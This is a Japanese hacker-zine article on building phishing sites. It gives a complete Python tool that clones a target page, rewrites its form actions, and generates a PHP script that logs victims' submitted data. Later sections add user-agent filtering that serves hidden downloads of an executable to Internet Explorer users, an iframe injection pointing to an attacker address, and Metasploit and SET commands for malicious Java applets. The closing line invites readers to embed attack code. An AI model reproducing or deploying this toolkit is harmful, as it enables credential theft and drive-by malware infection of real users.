x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: フィッシングについてのまとめ ---

著者：黒林檎

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) 最初に

　マイナンバー制度が始まりました。それに伴いマイナンバーを狙うフィッシングサイトが多数作成されています。
　そこで今回は自分でフィッシングツールを作成して、フィッシングサイトについて考えていきます。


■0x02.) 環境

　現状最新版のKali Linux(x64)で動作させます。

https://www.kali.org/downloads/　（kali LinuxのISOファイル）

　また、仮想環境用のイメージファイルがありますので、仮想環境で実行する方はそちらをおすすめします。

https://www.offensive-security.com/kali-linux-vmware-arm-image-download/　（VMイメージ）

　VMイメージで欲しい方は下記URLからダウンロードしてください。

https://www.offensive-security.com/kali-linux-vmware-arm-image-download/


■0x03.) 基礎のフィッシングスクリプトを作成

　Google　Chromeのページダウンロード機能はすばらしいです。Google Chromeのダウンロード機能を使用して作成したhtmlのform属性を書き換えるだけで簡単なフィッシングサイトを作成できてしまいます。しかし、ルート相対パスのウェブサイトはページが崩れてしまいます。

　ルート相対パスと相対パスの例は次の通りです。

<p>サイトルート相対パス</p>
<img src="/images/wizardbible.jpg"/>
<p>相対パス</p>
<img src="images/wizardbible.jpg"/>

　サイトルート相対パスの" / "は Webサーバのルートのため、サービス上では「http://wizardbible.org/images/wizardbible.jpg」などのアドレスを指し、適切に表示されますが、ローカルコンピュータ上ではローカルドライブ直下がルートとして認識されるために誤った場所が参照され、リンクが正しく無いため画像イメージなどが表示されません。
　これで現状のフィッシングツールではフィッシングサイトを作成できないため、工夫が必要になります。

　では単純にルート相対パスを潰してしまってはどうでしょう？
　Pythonではhtmlを簡単に整形できます。

　下記関数でそれを実行します。

-----
#########################
#リンクを絶対パスに置き換える#
##########################
def relaive(clonesite,base):
    fullpath = "/clone/index.html"
    site = "index.html"
    with open(clonesite, "r") as rf:
        doc = html.parse(rf).getroot()
        html.make_links_absolute(doc, base)
    fileopen=file("/clone/index.html","r").readlines()
    filewrite=file(fullpath,"w")
    try:
        for line in fileopen:
            counter=0
            match=re.search('post',line, flags=re.IGNORECASE)
            method_post=re.search("method=post", line, flags=re.IGNORECASE)
            if match or method_post:
                line = re.sub('action="*"', 'action="post.php"', line)
            match2 = re.search("swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
            if match2:
                line = line.replace("swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")
            filewrite.write(line)
	print "action attribute it was rewritten to post.php.."
    except:
	print "file write error.."
    finally:
        filewrite.close()
##################################################################################################
##################################################################################################
-----

　お気づきでしょうか？
　上記関数でaction="hoge"の値をpost.phpに書き換えています。
　今回は、入力された値を受け取りファイルに書き込むphpファイルも自動で作成することにします。python上でpost.phpというphpファイルとlog.txtというファイルを作成します。post.phpがlog.txtに対して作成したフィッシングサイトの入力値をそのまま書き込んでいくようにします。

-----
###############################
#phpスクリプトを自動で作成する#
###############################
def makephp(RAW_URL):
        logpath = "/clone/"
        filewrite = file("%s/post.php" % (logpath), "w")
        filewrite.write("""<?php $file = 'log.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (RAW_URL))
        filewrite.close()
        filewrite = file("%s/log.txt" % (logpath), "w")
        filewrite.write("")
        filewrite.close()
        if sys.platform == "darwin":
            subprocess.Popen("chown _www:_www '%s/log.txt'" % (logpath), shell=True).wait()
        else:
            subprocess.Popen("chown www-data:www-data '%s/log.txt'" % (logpath), shell=True).wait()
##################################################################################################
##################################################################################################
-----

　次のプログラムは完成版になります。

-----
##############
####完成版####
##############

from lxml import html
import subprocess
import os,sys,time,re,shutil,urllib2

###setting###
html_parser = html.HTMLParser(encoding="utf-8")
#############

def setdirectory():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '/clone')
    if check_os() == "windows":
        return "src/program_junk/"

def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

def makephp(RAW_URL):
        logpath = "/clone/"
        filewrite = file("%s/post.php" % (logpath), "w")
        filewrite.write("""<?php $file = 'log.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (RAW_URL))
        filewrite.close()
        filewrite = file("%s/log.txt" % (logpath), "w")
        filewrite.write("")
        filewrite.close()
        if sys.platform == "darwin":
            subprocess.Popen("chown _www:_www '%s/log.txt'" % (logpath), shell=True).wait()
        else:
            subprocess.Popen("chown www-data:www-data '%s/log.txt'" % (logpath), shell=True).wait()

def relaive(clonesite,base):
    fullpath = "/clone/index.html"
    site = "index.html"
    with open(clonesite, "r") as rf:
        doc = html.parse(rf).getroot()
        html.make_links_absolute(doc, base)
    fileopen=file("/clone/index.html","r").readlines()
    filewrite=file(fullpath,"w")
    try:
        for line in fileopen:
            counter=0
            match=re.search('post',line, flags=re.IGNORECASE)
            method_post=re.search("method=post", line, flags=re.IGNORECASE)
            if match or method_post:
                line = re.sub('action="*"', 'action="post.php"', line)
            filewrite.write(line)
	print "action attribute it was rewritten to post.php.."
    except:
	print "file write error.."
    finally:
        filewrite.close()

def clone(url):
    user_agent = "Mozilla/5.0 (Windows; Intel Mac OS X) Chrome/45.0.2454.101 Safari/537.36"
    try:
            wget = 0
            if os.path.isfile("/usr/local/bin/wget"):
                wget = 1
                
            if os.path.isfile("/usr/bin/wget"):
                wget = 1

            if os.path.isfile("/usr/local/wget"):
                wget = 1

            if wget == 1:
                subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            if wget == 0:
                headers = { 'User-Agent' : user_agent }
                req = urllib2.Request(url, None, headers)
                html = urllib2.urlopen(req).read()
                if len(html) > 1:
                    try:
                        filewrite = file(setdir + "/index.html", "w")
                        filewrite.write(html)
                    except:
                        print "index.html write error"
                    finally:
                        ilewrite.close()

    except:
        print "Sorry error to be continue .."
        pass



if __name__ == '__main__':
    print """
###############################################
#The python script that web site also was set #
#to be the creation of the link relative path #
#for r00tapple 				      #
###############################################
    """

    setdir = setdirectory()
    if not os.path.isdir(setdir):
        os.makedirs(setdir + "/web_clone")

    #input url
    URL = raw_input("URL of clone sites that you create: ")
    clone(URL)
    domain = raw_input("Enter the http://****.com/ of creating clones site :")
    makephp(domain)
    path = setdir + "/index.html"
    relaive(path,domain)
    print "END"

##################################################################################################
##################################################################################################
##################################################################################################
-----


■0x04.) 動作テスト

　0x03で作成したプログラムを動作すると次のようになります。
-----
root@r00tapple:~# python pfishing.py

###############################################
#The python script that web site also was set #
#to be the creation of the link relative path #
#for r00tapple 				      #
###############################################
    
URL of clone sites that you create: http://ruffnex.oc.to/
Enter the http://****.com/ of creating clones site :http://ruffnex.oc.to/
END
root@r00tapple:~# 
-----

　サイトリンクを絶対パスに置き換えることで、ルート相対パスのウェブサイトを綺麗にコピーし、基本的なフィッシングサイトとして動作できるようになりました。
　フィッシングサイトというと入力値を抜き取るだけと考える方も多いですが、最近では特定の環境下だけ攻撃を仕掛けるフィッシングサイトも出てきました。そこで今回は特定の環境下の場合違うコードを実行する方法を考えます。


■0x05.) UserAgentによって挙動を変更する

　入力された情報を抜き取るフィッシングサイトの一例は多いですが、特定の環境下の場合だけ悪意あるスクリプトを実行させたい場合はどうでしょう？　例えばIEのユーザーの場合だけ悪意あるJavaアプレットやマルウェアをダウンロードさせたりすればどうでしょう？
　IEの場合だけ0dayを実行するフィッシングサイトは最近ありました。

http://www.welivesecurity.com/2015/10/15/brolux-trojan-targeting-japanese-banks/

　このサイトはChromeユーザーなどには普通のフィッシングサイトに見えますが、IEの場合だけ0dayを仕掛けるフィッシングサイトです。それを簡単に真似するには二つの方法があります。

-----
####################################
####.htaccessによるUserAgent制限####
####################################
#OSがwindowsでブラウザがIEの場合ruffnex.oc.toにリダイレクトする

<Files ~ "^\.ht">
deny from all
</Files>

RewriteEngine On

SetEnvIfNoCase User-Agent "Windows"         ua_os=windows
SetEnvIfNoCase User-Agent "Mac.*OS"         ua_os=macos
SetEnvIfNoCase User-Agent "Linux"           ua_os=linux
SetEnvIfNoCase User-Agent "BSD"             ua_os=linux
SetEnvIfNoCase User-Agent "Android"         ua_os=android

SetEnvIfNoCase User-Agent "Safari"          ua_browser=safari
SetEnvIfNoCase User-Agent "(MSIE|Trident)"  ua_browser=ie
SetEnvIfNoCase User-Agent "Chrome"          ua_browser=chrome
SetEnvIfNoCase User-Agent "Firefox"         ua_browser=firefox
SetEnvIfNoCase User-Agent "Opera"           ua_browser=opera

RewriteBase /

RewriteCond %{REQUEST_URI} !^http://ruffnex.oc.to/.*$
RewriteCond %{ENV:ua_os} windows [OR]
RewriteCond %{ENV:ua_browser} ie
RewriteRule ^(.*)$ http://ruffnex.oc.to/$1 [R,L]
##################################################################################################
##################################################################################################
##################################################################################################
-----

　同様のことがJavascriptでも可能です。

-----
######################################
####javascriptによるUserAAgent制限####
######################################
#UserAgentがIEの場合だけtest.exeをダウンロードする

<script>
var downloadURL = function downloadURL(url) {
var hiddenIFrameID = 'hiddenDownloader',
iframe = document.getElementById(hiddenIFrameID);
if (iframe === null) {
iframe = document.createElement('iframe');
iframe.id = hiddenIFrameID;
iframe.style.display = 'none';
document.body.appendChild(iframe);
}
iframe.src = url;
};
var ua = window.navigator.userAgent;
if( ua.indexOf("Mozilla/5.0") != -1 ){
alert(1);
downloadURL('./test.exe');
}
</script>
##################################################################################################
##################################################################################################
##################################################################################################
-----

　pythonでhtmlを整形する際に、特定のタグ<body>タグなどをreplaceしてしまい悪意あるコードに書き換えてしまう方法などもあります。使用方法としては、フィッシングページを作成する際に同時にmetasploitで悪意あるJavaアプレットなどが挿入してしまう方法があります。
　また、下記ではhtml内の特定のタグを書き換える関数です。

-----
############################################
####<head>タグにiframeを挿入するサンプル####
############################################
def replases(html)
    #Rewrite the head tag of html
    fileopen=file("/clone/index.html","r").readlines()
    try:   
        line=line.replace("<head>", '<head><iframe src = "http://%s:80/" width="100" height="100" scrolling="no" ></iframe>' % (ipaddr))
        filewrite.write(line)
-----

　MetasploitのJava appletの生成も参考程度ですが、以下です。

-----
###########################################
#######Metasploitのコマンドサンプル########
###########################################
  msf > use exploit/multi/browser/java_signed_applet
      msf exploit(java_signed_applet) > show targets
            ...targets...
      msf exploit(java_signed_applet) > set TARGET <target-id>
      msf exploit(java_signed_applet) > show options
            ...show and set options...
      msf exploit(java_signed_applet) > exploit
-----

　setoolkitが使用している方法は、下記のようにすでに作成してあるJava.javaというアプレット用のファイルをコンパイルします。

----
subprocess.Popen("rm Java_Update.jar", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
subprocess.Popen("rm Java.class", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
subprocess.Popen("javac Java.java", shell=True).wait()
subprocess.Popen("jar cvf Java_Update.jar Java.class", shell=True).wait()
subprocess.Popen("jar ufm Java_Update.jar manifest.mf", shell=True).wait()
subprocess.Popen("cp Java_Update.jar ../../html/unsigned/unsigned.jar", shell=True)
-----

　これをコピーサイト作成の段階で、replaceで置き換えています。

・Pythonで悪意あるJava appletを挿入
http://exploit.co.il/hacking/metasploit-java-meterpreter-payload/
・PythonでMetasploitの自動化
http://www.primalsecurity.net/python-for-metasploit-automation/

　上記サイトなどを参考にmetasploitで攻撃コードを埋め込んで遊んでみてください。
　また、ユニークなフィッシングを思いついたら是非教えてください。


